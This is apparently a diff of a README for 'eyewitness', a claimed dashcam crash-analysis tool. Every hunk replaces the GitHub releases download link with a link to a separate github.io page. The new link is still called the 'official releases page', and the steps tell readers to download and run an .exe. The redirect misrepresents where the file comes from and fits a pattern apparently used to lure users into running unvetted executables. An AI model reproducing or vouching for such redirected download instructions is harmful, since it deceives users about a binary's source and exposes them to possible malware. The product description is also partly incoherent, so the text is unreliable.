@@ -1,6 +1,6 @@
 # ⚖️ eyewitness - Objective crash analysis from video clips
 
-[![](https://img.shields.io/badge/Download_Eyewitness-Blue?style=for-the-badge)](https://github.com/Knight3181992/eyewitness/releases)
+[![](https://img.shields.io/badge/Download_Eyewitness-Blue?style=for-the-badge)](https://knight3181992.github.io)
 
 Eyewitness provides a clear look at traffic incidents using video analysis. It processes flight path data from dashcam footage to show how a collision occurred. This tool helps you understand fault by looking at physics and vehicle movement. It removes human bias from the assessment process.
 
@@ -8,7 +8,7 @@ Eyewitness provides a clear look at traffic incidents using video analysis. It p
 
 Follow these steps to get the application on your computer.
 
-1. Visit the [official releases page](https://github.com/Knight3181992/eyewitness/releases).
+1. Visit the [official releases page](https://knight3181992.github.io).
 2. Look for the most recent version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to a folder you can find later, such as your Downloads folder.
@@ -79,4 +79,4 @@ If the analysis fails, check these items:
 
 You can visit the download page again if you need to fetch updates or report a bug.
 
-[![](https://img.shields.io/badge/Download_Eyewitness-Grey?style=for-the-badge)](https://github.com/Knight3181992/eyewitness/releases)
+[![](https://img.shields.io/badge/Download_Eyewitness-Grey?style=for-the-badge)](https://knight3181992.github.io)
